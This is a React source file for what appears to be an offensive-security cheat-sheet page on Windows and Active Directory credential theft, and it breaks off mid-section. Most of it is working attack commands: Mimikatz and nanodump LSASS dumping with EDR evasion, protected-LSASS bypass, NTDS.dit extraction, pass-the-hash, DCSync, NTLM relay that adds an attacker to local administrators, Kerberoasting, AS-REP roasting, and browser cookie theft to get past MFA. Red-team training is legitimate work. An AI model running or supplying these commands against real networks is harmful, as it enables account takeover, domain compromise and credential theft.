import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'SECRETS',
    color: 'green',
    nodes: [
      { title: 'Linux Credential Files', subtitle: '/etc/shadow • SSH keys • history • env', id: 'linux-creds' },
      { title: 'Browser & App Creds', subtitle: 'Chrome • Firefox • vault • secrets', id: 'browser-creds' },
      { title: 'Cloud Credential Harvesting', subtitle: 'AWS keys • Azure tokens • GCP service accounts', id: 'cloud-creds' },
    ]
  },
  {
    header: 'MEMORY DUMPS',
    color: 'orange',
    nodes: [
      { title: 'Mimikatz / LSASS', subtitle: 'sekurlsa • logonpasswords • dump', id: 'mimikatz' },
      { title: 'NTLM Hashes', subtitle: 'SAM • PTH • NTDS.dit', id: 'ntlm' },
      { title: 'Responder & NTLM Relay', subtitle: 'LLMNR • NBT-NS • NTLM capture • relay', id: 'responder' },
    ]
  },
  {
    header: 'KERBEROS & AD',
    color: 'yellow',
    nodes: [
      { title: 'Kerberos Tickets', subtitle: 'Extract • PTT • asktgt', id: 'kerb-tickets' },
      { title: 'Kerberoasting', subtitle: 'SPN accounts • TGS crack • hashcat 13100', id: 'kerberoasting' },
      { title: 'AS-REP Roasting', subtitle: 'No preauth • AS-REP • hashcat 18200', id: 'asrep' },
      { title: 'DCSync', subtitle: 'DS-Replication • domain controller', id: 'dcsync' },
    ]
  },
  {
    header: 'OFFLINE CRACKING',
    color: 'red',
    nodes: [
      { title: 'Password Cracking', subtitle: 'Wordlists • rules • masks', id: 'cracking' },
      { title: 'Domain Cached Creds', subtitle: 'DCC2 • offline cracking', id: 'dcc' },
    ]
  },
];

const techniques = [
  {
    id: 'mimikatz',
    title: 'Mimikatz & LSASS Credential Dumping',
    subtitle: 'Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS',
    tags: ['Mimikatz', 'LSASS', 'sekurlsa', 'logonpasswords', 'minidump', 'SafetyKatz'],
    accentColor: 'orange',
    overview: 'LSASS (Local Security Authority Subsystem Service) caches credentials for all logged-in users in memory — NTLM hashes, Kerberos tickets, and in some configurations plaintext WDigest passwords. Mimikatz\'s sekurlsa module reads this memory directly. Modern EDR solutions monitor LSASS access, making direct dumps detectable. Stealthier approaches use comsvcs.dll MiniDump or nanodump to write an LSASS minidump that is then parsed offline with Mimikatz — separating the dump from the credential extraction.',
    steps: [
      'LSASS (Local Security Authority Subsystem Service) stores credentials of all logged-in users in memory',
      'Must run as SYSTEM or with SeDebugPrivilege to access LSASS memory',
      'Direct Mimikatz: run sekurlsa::logonpasswords to extract all credentials in one shot',
      'Dump LSASS to disk first (minidump), then analyze offline to avoid EDR in-process detection',
      'SafetyKatz: .NET Mimikatz that creates a minidump and parses offline — avoids Mimikatz signatures',
      'Protected LSASS (PPL): use Backstab or a BYOVD technique to bypass PPL before dumping',
      'After obtaining hashes: pass-the-hash, pass-the-ticket, or crack offline',
    ],
    commands: [
      {
        title: 'Mimikatz credential extraction',
        code: `# Cobalt Strike — Mimikatz commands (via fork-and-run)
logonpasswords    # Shortcut for sekurlsa::logonpasswords
mimikatz sekurlsa::logonpasswords    # Full module
mimikatz sekurlsa::wdigest           # WDigest plaintext (Win7/old)
mimikatz sekurlsa::ekeys             # Kerberos encryption keys
mimikatz lsadump::sam                # SAM database hashes

# LSASS minidump (dump to disk, analyze offline)
mimikatz misc::memdump               # Dump LSASS to file
# Or via Task Manager (if available) / comsvcs.dll
shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Analyze offline
mimikatz sekurlsa::minidump lsass.dmp
mimikatz sekurlsa::logonpasswords

# SafetyKatz — .NET Mimikatz (less detected)
execute-assembly /path/to/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# nanodump — stealth LSASS dump (avoids common signatures)
execute-assembly /path/to/nanodump.exe --write C:\Temp\ndump.dmp
# Retrieve and analyze locally with Mimikatz`
      },
      {
        title: 'Protected LSASS bypass',
        code: `# Check if LSASS is Protected (PPL)
shell Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
# RunAsPPL = 1 means PPL is enabled — can't dump directly

# PPL bypass options:
# 1. Backstab — kills PPL via vulnerable driver
Backstab.exe -n lsass.exe -k    # Kill protection then dump

# 2. PPLdump — exploits known PPL bypass
execute-assembly /path/to/PPLdump.exe 664 C:\Temp\lsass.dmp   # PID 664 = lsass

# 3. Mimikatz PPL bypass (requires admin + vulnerable driver)
mimikatz !sekurlsa::logonpasswords   # The "!" prefix uses kernel driver

# nanodump with fork (creates a child of LSASS — bypasses some detection)
execute-assembly /path/to/nanodump.exe --fork --write C:\Temp\ndump.dmp`
      }
    ]
  },
  {
    id: 'ntlm',
    title: 'NTLM Hash Extraction & Usage',
    subtitle: 'Extract NTLM hashes from SAM and NTDS.dit for pass-the-hash and cracking',
    tags: ['NTLM', 'SAM', 'NTDS.dit', 'impacket', 'pass-the-hash', 'secretsdump'],
    accentColor: 'orange',
    overview: 'NTLM hashes are unsalted MD4 hashes of Windows account passwords. The local SAM database stores hashes for local accounts, accessible as SYSTEM via registry save or Volume Shadow Copy. NTDS.dit is the Active Directory database on domain controllers — it contains every domain account hash and can be extracted via VSS or DCSync. Crucially, NTLM hashes can be used directly for authentication (Pass-the-Hash) without needing to crack them first.',
    steps: [
      'SAM database: stores local account NTLM hashes — accessible as SYSTEM via reg save or shadow copy',
      'NTDS.dit: the AD database on domain controllers — contains all domain account NTLM hashes',
      'Dump SAM + SYSTEM hive offline and use impacket secretsdump to extract hashes',
      'For NTDS.dit: use secretsdump remotely (with DA creds) or copy via Volume Shadow Copy',
      'NTLM hashes: use for pass-the-hash (WMI, SMB, WinRM) without knowing the plaintext password',
      'Crack NTLM hashes offline with hashcat (very fast — NTLM has no salt)',
    ],
    commands: [
      {
        title: 'SAM and NTDS.dit extraction',
        code: `# SAM dump (local, requires SYSTEM)
# Via registry save
shell reg save HKLM\SAM C:\Temp\sam.hiv
shell reg save HKLM\SYSTEM C:\Temp\system.hiv
shell reg save HKLM\SECURITY C:\Temp\security.hiv

# Offline extraction with secretsdump
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
# Outputs: Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::

# NTDS.dit via VSS (Volume Shadow Copy)
shell vssadmin create shadow /for=C:
shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
shell copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
impacket-secretsdump -ntds ntds.dit -system system.hiv LOCAL

# Remote NTDS dump via secretsdump (with DA creds)
impacket-secretsdump corp.local/Administrator:Password@DC01
impacket-secretsdump -hashes :NTLM_HASH corp.local/Administrator@DC01

# Mimikatz lsadump::lsa (from DC beacon as SYSTEM)
mimikatz lsadump::lsa /patch          # Dump all domain hashes from DC
mimikatz lsadump::sam                 # SAM hashes`
      },
      {
        title: 'Pass-the-Hash',
        code: `# Pass-the-Hash — use NTLM hash without cracking
# Cobalt Strike — make_token with hash
pth DOMAIN\Administrator <NTLM_HASH>
# Now beacon is operating as Administrator (hash passed to WinAPI)

# CS built-in PTH
shell net use \\DC01\C$ /user:CORP\Administrator
# Not needed with pth — just use UNC paths after pth

# Impacket tools with hash
impacket-wmiexec -hashes :NTLM_HASH CORP/Administrator@TARGET
impacket-smbexec -hashes :NTLM_HASH CORP/Administrator@TARGET
impacket-psexec -hashes :NTLM_HASH CORP/Administrator@TARGET

# Evil-WinRM with hash
evil-winrm -i TARGET -u Administrator -H NTLM_HASH

# Cracking NTLM with hashcat
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# NTLM: no salt — extremely fast (100GB/s on GPU)`
      }
    ]
  },
  {
    id: 'kerb-tickets',
    title: 'Kerberos Ticket Extraction & Pass-the-Ticket',
    subtitle: 'Extract TGTs and TGS tickets from memory and use them for authentication',
    tags: ['Rubeus', 'PTT', 'TGT', 'TGS', 'kirbi', 'overpass-the-hash'],
    accentColor: 'yellow',
    overview: 'Kerberos tickets (TGTs and TGS) are stored in LSASS memory and can be extracted and reused without knowing the account password. A TGT (Ticket Granting Ticket) is the most powerful — it can be used to request TGS tickets for any service the account has access to. Rubeus provides the most comprehensive Kerberos toolkit: dump, monitor (catch tickets as they arrive), harvest, and inject. Overpass-the-Hash converts an NTLM hash into a Kerberos TGT, enabling Kerberos-based authentication with a hash.',
    steps: [
      'Kerberos tickets stored in LSASS memory — extract TGTs and TGS tickets using Mimikatz or Rubeus',
      'Pass-the-Ticket: inject an extracted ticket into the current logon session for lateral movement',
      'Overpass-the-Hash: use an NTLM hash to request a TGT (get Kerberos from NTLM)',
      'Rubeus: modern Kerberos toolkit — monitor, harvest, dump, and inject tickets',
      'TGT extraction is more powerful than TGS — TGT can be used to request tickets for any service',
      'Import extracted tickets and use them for accessing services in the target environment',
    ],
    commands: [
      {
        title: 'Rubeus ticket operations',
        code: `# Dump all Kerberos tickets in memory
execute-assembly /path/to/Rubeus.exe dump                  # All tickets
execute-assembly /path/to/Rubeus.exe dump /service:krbtgt  # TGTs only
execute-assembly /path/to/Rubeus.exe dump /luid:0x3e4      # Specific logon session

# Monitor for new TGTs (catch admin logins)
execute-assembly /path/to/Rubeus.exe monitor /interval:5 /nowrap

# Harvest TGTs (continuous monitoring)
execute-assembly /path/to/Rubeus.exe harvest /interval:30

# Pass-the-Ticket — inject ticket into current session
execute-assembly /path/to/Rubeus.exe ptt /ticket:<BASE64_TICKET>
# Or from .kirbi file:
execute-assembly /path/to/Rubeus.exe ptt /ticket:ticket.kirbi

# Overpass-the-Hash — NTLM hash → TGT
execute-assembly /path/to/Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /domain:corp.local /ptt
# /ptt = pass-the-ticket immediately

# Mimikatz ticket operations
mimikatz sekurlsa::tickets /export              # Export all tickets to disk
mimikatz kerberos::list /export                 # Export from current session
mimikatz kerberos::ptt ticket.kirbi             # Import ticket
mimikatz kerberos::purge                        # Clear all tickets

# Verify injected ticket
klist    # List tickets in current session`
      }
    ]
  },
  {
    id: 'dcsync',
    title: 'DCSync — Domain Controller Sync Attack',
    subtitle: 'Abuse DS-Replication rights to pull password hashes from the domain controller',
    tags: ['DCSync', 'DS-Replication', 'Mimikatz', 'lsadump::dcsync', 'krbtgt'],
    accentColor: 'yellow',
    overview: 'DCSync mimics the behaviour of a domain controller requesting replication data from another DC. Using DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (held by Domain Admins by default), it pulls the NTLM hash of any domain account — including krbtgt — over the network without running any code on the DC. This is the primary method for extracting the krbtgt hash needed for Golden Ticket attacks and is far stealthier than dumping LSASS on the DC itself.',
    steps: [
      'DCSync abuses the MS-DRSR replication protocol — pretend to be a domain controller requesting replication data',
      'Requires: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (Domain Admins have these)',
      'No code runs on the DC — entirely network-based attack (no LSASS access needed)',
      'Can pull any domain account hash including krbtgt (needed for Golden Tickets)',
      'Much stealthier than dumping LSASS on the DC — generates replication events in DC logs',
      'Use to dump krbtgt, Administrator, and all service account hashes for persistence',
    ],
    commands: [
      {
        title: 'DCSync with Mimikatz',
        code: `# DCSync — pull specific account hash
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz lsadump::dcsync /domain:corp.local /user:CORP\svc-sql

# Dump ALL domain hashes
mimikatz lsadump::dcsync /domain:corp.local /all /csv
# Outputs: username:RID:LM_HASH:NT_HASH

# Via Cobalt Strike beacon (running as DA)
dcsync corp.local CORP\krbtgt
dcsync corp.local CORP\Administrator

# Remote DCSync via impacket (from Linux — with DA creds)
impacket-secretsdump -just-dc corp.local/Administrator:Password@DC01.corp.local
impacket-secretsdump -just-dc -hashes :NTLM_HASH corp.local/Administrator@DC01

# Check who has DCSync rights (PowerView)
Get-ObjectAcl -DistinguishedName "dc=corp,dc=local" -ResolveGUIDs | 
  Where-Object { ($_.ActiveDirectoryRights -match "GenericAll|ExtendedRight") -and ($_.SecurityIdentifier -notmatch "S-1-5-18|S-1-5-32") } |
  Select-Object SecurityIdentifier,ActiveDirectoryRights`
      }
    ]
  },
  {
    id: 'cracking',
    title: 'Password Cracking',
    subtitle: 'Crack NTLM, NTLMv2, Kerberos hashes with hashcat wordlists, rules, and masks',
    tags: ['hashcat', 'NTLM', 'NTLMv2', 'Kerberoast', 'rockyou', 'rules', 'masks'],
    accentColor: 'red',
    overview: 'Offline password cracking tests candidate passwords against captured hashes without interacting with the target. NTLM hashes (mode 1000) have no salt and are extremely fast — a modern GPU tests hundreds of billions of hashes per second against rockyou.txt. Rule-based attacks apply transformations to wordlist entries (append numbers, capitalise, leet substitution). Mask attacks target known password patterns (Company+Year+Symbol). Kerberoast hashes (mode 13100) and NTLMv2 (mode 5600) are slower due to the underlying hash algorithm complexity.',
    steps: [
      'NTLM hashes (mode 1000): no salt — fastest cracking. GPU can test billions/second',
      'Wordlist attack: start with rockyou.txt, then add target-specific words',
      'Rule-based attack: apply mangling rules (leetspeak, append numbers, capitalize) to wordlist',
      'Mask attack: when you know the password pattern (e.g., Company+Year+Symbol)',
      'Combinator attack: combine two wordlists — "company" + "2024" = "company2024"',
      'KerberoastingHash (mode 13100): offline cracking of Kerberos TGS tickets',
    ],
    commands: [
      {
        title: 'Hashcat cracking techniques',
        code: `# NTLM straight wordlist
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM + rules (best64, dive, Hob064)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# Mask attack — Company+Year pattern
hashcat -m 1000 hashes.txt -a 3 "Corp?d?d?d?d!"     # Corp1234!
hashcat -m 1000 hashes.txt -a 3 "?u?l?l?l?d?d?d?d"  # Passes like "Pass2024"
hashcat -m 1000 hashes.txt -a 3 --increment --increment-min 8 "?a?a?a?a?a?a?a?a?a?a?a?a"

# Combinator — word1+word2
hashcat -m 1000 hashes.txt -a 1 words1.txt words2.txt

# Kerberoasting (TGS ticket)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# AS-REP Roasting
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv2 (captured from Responder)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# Show cracked passwords
hashcat -m 1000 hashes.txt --show`
      }
    ]
  },
  {
    id: 'dcc',
    title: 'Domain Cached Credentials (DCC2)',
    subtitle: 'Extract and crack domain credentials cached locally on workstations',
    tags: ['DCC2', 'cached credentials', 'MS-Cache2', 'hashcat mode 2100', 'offline'],
    accentColor: 'red',
    overview: 'Domain Cached Credentials (DCC2 / MS-Cache v2) are stored in the SECURITY registry hive to allow domain users to log in when the DC is unreachable. They use a PBKDF2-like derivation (10240 rounds of MD4) making them significantly slower to crack than NTLM — expect 1–10 MH/s vs 100 GH/s. Critically, DCC2 hashes cannot be used for Pass-the-Hash — they must be cracked to plaintext first. They are most valuable when a domain user\'s password can be recovered this way after the DC is no longer accessible.',
    steps: [
      'Windows caches the last 10 domain logons locally — allows logon when DC is unreachable',
      'Cached credentials are stored in SECURITY hive as DCC2 (MSCACHE2) hashes',
      'DCC2 uses PBKDF2-like derivation — very slow to crack (unlike NTLM)',
      'Requires SYSTEM access to read the SECURITY registry hive',
      'Extract with Mimikatz lsadump::cache or Secretsdump',
      'DCC2 hashes cannot be used for PTH — must crack to plaintext first',
    ],
    commands: [
      {
        title: 'DCC2 extraction and cracking',
        code: `# Dump cached credentials (requires SYSTEM)
mimikatz lsadump::cache
# Outputs: * Username : john.smith
#          * Domain   : CORP
#          * Password : (null)
#          * Hash     : $DCC2$10240#john.smith#<HASH>

# Via secretsdump (offline)
impacket-secretsdump -security security.hiv -system system.hiv LOCAL
# Outputs: $DCC2$10240#username#hash

# Hashcat DCC2 cracking (mode 2100 — slow!)
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
# Note: DCC2 uses 10240 iterations of MD4/PBKDF2 — much slower than NTLM
# Expect: ~1-10 MH/s on GPU (vs 100GB/s for NTLM)

# Prioritize cracking shorter/simpler passwords first
hashcat -m 2100 dcc2_hashes.txt -a 3 "?u?l?l?l?l?d?d?d?d"  # Masks first
hashcat -m 2100 dcc2_hashes.txt words.txt -r best64.rule      # Then rules`
      }
    ]
  },
];

const advancedCreds = [
  {
    id: 'responder',
    title: 'Responder — LLMNR/NBT-NS Poisoning & NTLM Relay',
    subtitle: 'Capture NTLMv2 hashes by poisoning name resolution, relay to SMB/LDAP for code execution',
    tags: ['Responder', 'LLMNR', 'NBT-NS', 'NTLM relay', 'ntlmrelayx', 'SMB signing', 'Coerce', 'PetitPotam'],
    accentColor: 'orange',
    overview: `LLMNR (Link-Local Multicast Name Resolution) and NBT-NS are Windows fallback name resolution protocols — when DNS fails to resolve a hostname, Windows broadcasts LLMNR/NBT-NS queries on the local subnet. Responder answers these queries with the attacker's IP, causing the requesting host to initiate NTLM authentication — leaking NTLMv2 hashes.

Two operational modes:
1. CAPTURE: Responder captures the NTLMv2 hash for offline cracking (hashcat -m 5600)
2. RELAY: ntlmrelayx forwards the NTLM auth to another target (LDAP, SMB, HTTP) — achieves code execution or privilege escalation without cracking

Critical prerequisite for relay: target must have SMB signing disabled. Most workstations don't sign by default; Domain Controllers always sign. Use netexec to check signing status across the subnet before deciding on capture vs relay.`,
    steps: [
      'Check SMB signing status on all targets before choosing capture vs relay: nxc smb subnet --gen-relay-list',
      'CAPTURE MODE: run Responder on the LAN interface — wait for LLMNR/NBT-NS queries and capture NTLMv2 hashes',
      'Crack captured NTLMv2 hashes offline with hashcat -m 5600',
      'RELAY MODE: run Responder with SMB/HTTP disabled (for ntlmrelayx), run ntlmrelayx targeting hosts without SMB signing',
      'ntlmrelayx with --no-smb-server and --targets: relays captured auth to target, executes command or dumps SAM',
      'Coerce authentication proactively: PetitPotam, PrinterBug (SpoolSample), DFSCoerce against DCs or servers',
      'LDAP relay: relay to LDAP(S) to add DCSync rights, add computers to AD, or perform shadow credentials attacks',
    ],
    commands: [
      {
        title: 'Responder capture and NTLM relay',
        code: `# --- PREREQUISITE: Check SMB signing ---
nxc smb 10.10.10.0/24 --gen-relay-list targets_no_signing.txt
# Outputs list of hosts without SMB signing — valid relay targets

# --- MODE 1: CAPTURE (hash collection) ---
# Run Responder on LAN interface
sudo responder -I eth0 -wdv
# -I = interface, -w = WPAD, -d = DHCP, -v = verbose
# Wait for LLMNR/NBT-NS queries — hashes appear in /usr/share/responder/logs/

# Crack captured NTLMv2 hashes
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# --- MODE 2: RELAY (code execution without cracking) ---
# Step 1: Disable SMB and HTTP in Responder (ntlmrelayx handles those)
sudo nano /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# Step 2: Run Responder (still poisons, sends auth to ntlmrelayx)
sudo responder -I eth0 -wdv

# Step 3: Run ntlmrelayx against targets without SMB signing
# Execute command on all relay targets:
ntlmrelayx.py -tf targets_no_signing.txt -smb2support -c "net localgroup administrators attacker /add"

# Dump SAM on relay targets:
ntlmrelayx.py -tf targets_no_signing.txt -smb2support

# LDAP relay — add DCSync rights to attacker account:
ntlmrelayx.py -t ldap://DC01.corp.local --escalate-user attacker --no-smb-server

# LDAP relay — shadow credentials (add key credential to target):
ntlmrelayx.py -t ldaps://DC01.corp.local --shadow-credentials --shadow-target TARGET$ --no-smb-server

# --- COERCION: Force authentication from servers ---
# PetitPotam — coerce DC to authenticate to us (for relay to LDAP/ADCS)
python3 PetitPotam.py -u lowpriv -p Password ATTACKER DC01.corp.local
# Now relay the DC's auth to ADCS HTTP enrollment endpoint:
ntlmrelayx.py -t http://CA.corp.local/certsrv/mscep/mscep.dll --adcs --template DomainController

# PrinterBug — SpoolSample coercion
python3 SpoolSample.py DC01.corp.local ATTACKER

# DFSCoerce
python3 dfscoerce.py -u user -p Pass -d corp.local ATTACKER DC01.corp.local`
      }
    ]
  },
  {
    id: 'kerberoasting',
    title: 'Kerberoasting',
    subtitle: 'Request TGS tickets for SPN-configured service accounts and crack them offline',
    tags: ['Kerberoasting', 'SPN', 'TGS', 'Rubeus', 'Impacket', 'hashcat 13100', 'GetUserSPNs', 'service account'],
    accentColor: 'yellow',
    overview: `Kerberoasting exploits the Kerberos TGS-REQ mechanism: any authenticated domain user can request a TGS ticket for any service account (account with an SPN set). The ticket is encrypted with the service account's NTLM hash — crackable offline.

Attack profile:
- No admin rights required — any domain user can perform this attack
- Works entirely over Kerberos (port 88) — no LDAP enumeration needed after the initial SPN query
- Target: service accounts with SPNs set AND weak passwords (SQL service accounts, app service accounts, legacy accounts)
- RC4 vs AES: RC4-encrypted TGS tickets (etype 0x17) crack vastly faster than AES256 — request RC4 specifically by downgrading enctype in the AS-REQ

Prioritize service accounts that are members of privileged groups (Domain Admins is surprisingly common for SQL service accounts in legacy environments).`,
    steps: [
      'Enumerate SPNs in the domain to identify kerberoastable service accounts',
      'Request TGS tickets for target SPNs — tickets encrypted with the service account hash',
      'Export tickets in hashcat format (mode 13100) — works from both Linux and Windows',
      'Crack with hashcat: prioritize short passwords, number patterns, company name variants',
      'RC4 downgrade: request etype 0x17 (RC4) tickets instead of AES — 10-100x faster cracking',
      'Prioritize accounts with admin rights: check BloodHound for DA/local admin paths from service accounts',
    ],
    commands: [
      {
        title: 'Kerberoasting — Rubeus, Impacket, Hashcat',
        code: `# --- ENUMERATION ---
# PowerView — find all kerberoastable accounts
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof
# Focus on: accounts in privileged groups, recently used accounts, password never expires

# Impacket — enumerate SPNs from Linux
impacket-GetUserSPNs corp.local/lowpriv:Password -dc-ip DC01 -request

# --- RUBEUS (on-prem, from beacon) ---
# Request all TGS tickets (etype 0x17 = RC4 — much faster to crack)
execute-assembly /tools/Rubeus.exe kerberoast /nowrap /tgtdeleg /rc4opsec
# /tgtdeleg = request ticket delegation (no DC interaction for each SPN)
# /rc4opsec = request RC4 (etype 0x17) even if account supports AES

# Target specific user
execute-assembly /tools/Rubeus.exe kerberoast /user:svc-sql /nowrap /tgtdeleg
execute-assembly /tools/Rubeus.exe kerberoast /user:svc-mssql /domain:corp.local /nowrap

# List kerberoastable users without requesting tickets (recon)
execute-assembly /tools/Rubeus.exe kerberoast /stats

# --- IMPACKET (from Linux) ---
impacket-GetUserSPNs corp.local/lowpriv:Password -dc-ip DC01 -request -outputfile kerberoast_hashes.txt
impacket-GetUserSPNs corp.local/lowpriv -hashes :NTLM_HASH -dc-ip DC01 -request

# Request only RC4 tickets (etype 23) for faster cracking:
impacket-GetUserSPNs corp.local/lowpriv:Password -dc-ip DC01 -request -request-user svc-sql

# --- CRACKING ---
# Mode 13100 = Kerberos 5 TGS-REP RC4 (most common)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule

# AES256 tickets (mode 19700 — if only AES returned)
hashcat -m 19700 kerberoast_aes_hashes.txt /usr/share/wordlists/rockyou.txt

# Custom wordlist for company-pattern passwords:
echo "Corp2023! Corp2024! Corp2024@ Summer2024! Winter2024!" > company_words.txt
hashcat -m 13100 hashes.txt company_words.txt -r best64.rule`
      }
    ]
  },
  {
    id: 'asrep',
    title: 'AS-REP Roasting',
    subtitle: 'Exploit accounts with Kerberos pre-authentication disabled to capture crackable AS-REP hashes',
    tags: ['AS-REP Roasting', 'Kerberos preauth', 'DONT_REQ_PREAUTH', 'Rubeus', 'GetNPUsers', 'hashcat 18200'],
    accentColor: 'yellow',
    overview: `AS-REP Roasting targets domain accounts with the "Do not require Kerberos preauthentication" flag set (DONT_REQ_PREAUTH). Without preauthentication, anyone can request a Kerberos AS-REP for that account without supplying a password — the AS-REP is partially encrypted with the account's hash and is crackable offline.

Unlike Kerberoasting:
- No authentication required — attackers with only a list of usernames (or no account at all) can roast these accounts
- Common in legacy migrations, testing accounts, and helpdesk setups that disabled preauth for compatibility

BloodHound flags these accounts with "AS-REP Roastable" — prioritize them in large AD environments. The hash (mode 18200) uses PBKDF2 so it's slower than NTLM but faster than DCC2.`,
    steps: [
      'Enumerate accounts with DONT_REQ_PREAUTH flag: PowerView Get-DomainUser -PreauthNotRequired',
      'Request AS-REP hashes for those accounts — no password required',
      'Crack with hashcat mode 18200 (Kerberos 5 AS-REP)',
      'From outside the domain: use impacket GetNPUsers.py with a username list — no credentials needed',
      'BloodHound marks these in the "Find AS-REP Roastable Users" query',
    ],
    commands: [
      {
        title: 'AS-REP Roasting — enumeration, capture, cracking',
        code: `# --- ENUMERATION ---
# PowerView — find accounts with preauth disabled
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,distinguishedname
# or:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName

# BloodHound query (Cypher):
# MATCH (u:User {dontreqpreauth: true}) RETURN u.name

# --- RUBEUS (on-prem, from beacon) ---
execute-assembly /tools/Rubeus.exe asreproast /nowrap
# Requests AS-REP for all accounts with preauth disabled
execute-assembly /tools/Rubeus.exe asreproast /user:targetuser /nowrap
execute-assembly /tools/Rubeus.exe asreproast /format:hashcat /nowrap   # hashcat format directly

# --- IMPACKET (from Linux — no initial creds needed if usernames known) ---
# With valid credentials (enumerate then roast):
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip DC01 -format hashcat
# With credentials (find + roast in one step):
impacket-GetNPUsers corp.local/lowpriv:Password -dc-ip DC01 -request -format hashcat -outputfile asrep.txt
# All accounts at once:
impacket-GetNPUsers corp.local/lowpriv:Password -dc-ip DC01 -no-pass -usersfile users.txt

# --- CRACKING ---
# Mode 18200 = Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
hashcat -m 18200 asrep_hashes.txt -a 3 "?u?l?l?l?l?d?d?d?d!"   # Mask: Passw0rd! pattern

# --- SET THE FLAG (if you have GenericAll on an account) ---
# Temporarily disable preauth to roast any account you control an ACE on:
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $true
# Roast, then restore:
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $false`
      }
    ]
  },
  {
    id: 'browser-creds',
    title: 'Browser & Application Credential Harvesting',
    subtitle: 'Extract saved passwords, cookies, and secrets from browsers, password managers, and application credential stores',
    tags: ['SharpChrome', 'LaZagne', 'cookies', 'Chrome DPAPI', 'Firefox decrypt', 'password manager', '1Password', 'KeePass'],
    accentColor: 'green',
    overview: `Modern browsers (Chrome, Edge, Firefox) store credentials using DPAPI or NSS (Network Security Services). As the logged-in user, all DPAPI-protected browser credentials are accessible without knowing the user's password. Cookie extraction is often more valuable than passwords — session cookies bypass MFA and allow direct account access.

Target priority:
1. Browser cookies for SaaS applications (AWS console, GitHub, Azure portal, corporate SSO)
2. Saved passwords in browsers (often include VPN, internal tools, personal accounts)
3. Password manager databases (KeePass .kdbx, 1Password local vault)
4. Application credential files (git credentials, WinSCP session data, PuTTY private keys)`,
    steps: [
      'SharpChrome: extracts Chrome/Edge logins, cookies, and history in one execute-assembly call',
      'LaZagne: multi-platform credential extractor covering 60+ applications including browsers, mail, databases',
      'Firefox credentials: stored in logins.json encrypted with key4.db — decrypt with LaZagne or firepwd',
      'KeePass: if a .kdbx is open, memory dump the master key; or monitor for KeePass process and inject',
      'Session cookies: import extracted cookies into a browser to hijack active sessions without credentials',
      'WinSCP/FileZilla/PuTTY: session data in registry or config files — often contain SSH/SFTP credentials',
    ],
    commands: [
      {
        title: 'Browser and application credential extraction',
        code: `# --- CHROME / EDGE (Chromium-based) ---
# SharpChrome — extract logins + cookies (requires DPAPI as current user)
execute-assembly /tools/SharpChrome.exe logins     # Saved passwords
execute-assembly /tools/SharpChrome.exe cookies    # Session cookies
execute-assembly /tools/SharpChrome.exe history    # Browsing history
execute-assembly /tools/SharpChrome.exe all        # Everything

# Decrypt Chrome credentials manually
# Masterkey in: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State (JSON, base64-encoded DPAPI blob)
# Passwords in: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data (SQLite)
shell copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" C:\\Temp\\ChromeLoginData
# Transfer and decrypt offline with ChromePass or HackBrowserData

# HackBrowserData — multi-browser all-in-one
execute-assembly /tools/HackBrowserData.exe -b chrome -f json -o C:\\Temp\\browser_dump

# --- FIREFOX ---
# LaZagne covers Firefox automatically
execute-assembly /tools/LaZagne.exe browsers -firefox
# Manual: copy Firefox profile dir for offline decryption
shell dir "%APPDATA%\\Mozilla\\Firefox\\Profiles\\"
# firepwd.py (offline): python3 firepwd.py -d ProfileDir/

# --- LAZAGNE — comprehensive credential dump ---
